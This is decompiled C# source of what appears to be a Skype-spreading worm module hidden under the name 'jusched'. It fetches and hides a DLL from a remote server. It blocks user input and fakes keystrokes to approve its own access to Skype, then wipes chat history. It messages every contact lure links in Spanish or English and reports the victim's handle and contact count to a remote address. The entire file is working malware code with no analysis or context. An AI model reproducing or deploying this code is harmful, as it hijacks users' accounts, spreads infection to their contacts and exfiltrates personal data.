using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using jusched.My;

namespace jusched;

public class SkypeSP
{
	private const int SW_SHOWNORMAL = 1;

	private const int SW_MINIMIZE = 6;

	private const bool LOCKED = true;

	private const bool UNLOCKED = false;

	public static string pais = CultureInfo.CurrentUICulture.Name.Substring(3);

	public static System.Timers.Timer aTimer = new System.Timers.Timer();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern long SetForegroundWindow(long long_0);

	[DllImport("user32.dll")]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("User32.dll")]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	[DllImport("User32.dll")]
	private static extern IntPtr SetFocus(IntPtr intptr_0);

	[DllImport("User32.dll")]
	private static extern bool BlockInput(bool bool_0);

	public static void skype_0()
	{
		aTimer.Elapsed += delegate
		{
			NICE();
		};
		aTimer.Interval = 900000.0;
		aTimer.Enabled = true;
	}

	public static void NICE()
	{
		string text = Environment.CurrentDirectory + "\\Skype4COM.dll";
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (!process.ProcessName.Contains("skype"))
			{
				continue;
			}
			try
			{
				if (!File.Exists(text))
				{
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Configuration.skydll, text);
					global_0.Registar_Dlls(text);
					File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			skype_attach();
			Thread.Sleep(5000);
			skype_cc();
			aTimer.Interval = 3600000.0;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void check()
	{
		Process[] processesByName = Process.GetProcessesByName("Skype");
		foreach (Process process in processesByName)
		{
			ShowWindow(process.MainWindowHandle, 1);
			ShowWindow(process.MainWindowHandle, 1);
		}
		IntPtr intPtr = FindWindowEx(FindWindow("tSkMainForm", null), IntPtr.Zero, "TZapCommunicator", null);
		if (!intPtr.Equals((object?)(nint)IntPtr.Zero))
		{
			SetForegroundWindow((long)intPtr);
			SetFocus(intPtr);
			BlockInput(bool_0: true);
			Thread.Sleep(500);
			SendKeys.SendWait("{tab}");
			Thread.Sleep(100);
			SendKeys.SendWait("+{tab}");
			Thread.Sleep(100);
			SendKeys.SendWait("{ENTER}");
			BlockInput(bool_0: false);
			Process[] processesByName2 = Process.GetProcessesByName("Skype");
			foreach (Process process2 in processesByName2)
			{
				ShowWindow(process2.MainWindowHandle, 6);
			}
			Thread.Sleep(10000);
			skype_msg();
		}
	}

	private static void skype_attach()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.skype", ""));
		object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
		object obj = objectValue2;
		NewLateBinding.LateCall(obj, (Type)null, "Attach", new object[2] { 7, false }, (string[])null, (Type[])null, (bool[])null, true);
		Thread.Sleep(8000);
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "AttachmentStatus", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1, false))
		{
			check();
		}
		else
		{
			skype_msg();
		}
		obj = null;
	}

	private static void skype_cc()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.skype", ""));
		object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
		object obj = objectValue2;
		NewLateBinding.LateCall(obj, (Type)null, "ClearChatHistory", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		obj = null;
	}

	private static void skype_msg()
	{
		checked
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.skype", ""));
				int num = 0;
				object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
				string text = Conversions.ToString(rand_msg());
				object obj = objectValue2;
				if (pais.Contains("ES"))
				{
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "Friends", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (enumerator.MoveNext())
						{
							object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
							object obj2 = obj;
							object[] array = new object[2];
							object[] array2 = array;
							object obj3 = objectValue3;
							array2[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "handle", new object[0], (string[])null, (Type[])null, (bool[])null));
							array[1] = text;
							object[] array3 = array;
							object[] array4 = array3;
							bool[] array5 = new bool[2] { true, true };
							NewLateBinding.LateCall(obj2, (Type)null, "SendMessage", array4, (string[])null, (Type[])null, array5, true);
							if (array5[0])
							{
								NewLateBinding.LateSetComplex(obj3, (Type)null, "handle", new object[1] { RuntimeHelpers.GetObjectValue(array3[0]) }, (string[])null, (Type[])null, true, false);
							}
							if (array5[1])
							{
								text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[1]), typeof(string));
							}
							num++;
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				else if (pais.Contains("EN"))
				{
					IEnumerator enumerator2 = default(IEnumerator);
					try
					{
						enumerator2 = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "Friends", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (enumerator2.MoveNext())
						{
							object objectValue4 = RuntimeHelpers.GetObjectValue(enumerator2.Current);
							object obj4 = obj;
							object[] array6 = new object[2];
							object[] array7 = array6;
							object obj3 = objectValue4;
							array7[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "handle", new object[0], (string[])null, (Type[])null, (bool[])null));
							array6[1] = "Fuck Yeah XD http://tiny.cc/tqwlmw?profile_001.jpg !";
							object[] array3 = array6;
							object[] array8 = array3;
							bool[] array5 = new bool[2] { true, false };
							NewLateBinding.LateCall(obj4, (Type)null, "SendMessage", array8, (string[])null, (Type[])null, array5, true);
							if (array5[0])
							{
								NewLateBinding.LateSetComplex(obj3, (Type)null, "handle", new object[1] { RuntimeHelpers.GetObjectValue(array3[0]) }, (string[])null, (Type[])null, true, false);
							}
							num++;
						}
					}
					finally
					{
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
				obj = null;
				string text2 = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "handle", new object[0], (string[])null, (Type[])null, (bool[])null));
				global_0.webget(Configuration.info + "?xxx=Skype " + num + " contacts From " + text2.ToString());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static object rand_msg()
	{
		Random random = new Random();
		string[] array = new string[3] { "Manya a este sonso http://tiny.cc/tqwlmw", "Me Fregue mira http://tiny.cc/zrwlmw jajaja xD ", "Que tal mujeron http://tiny.cc/1swlmw asuuu!!" };
		int num = random.Next(3);
		return array[num];
	}
}
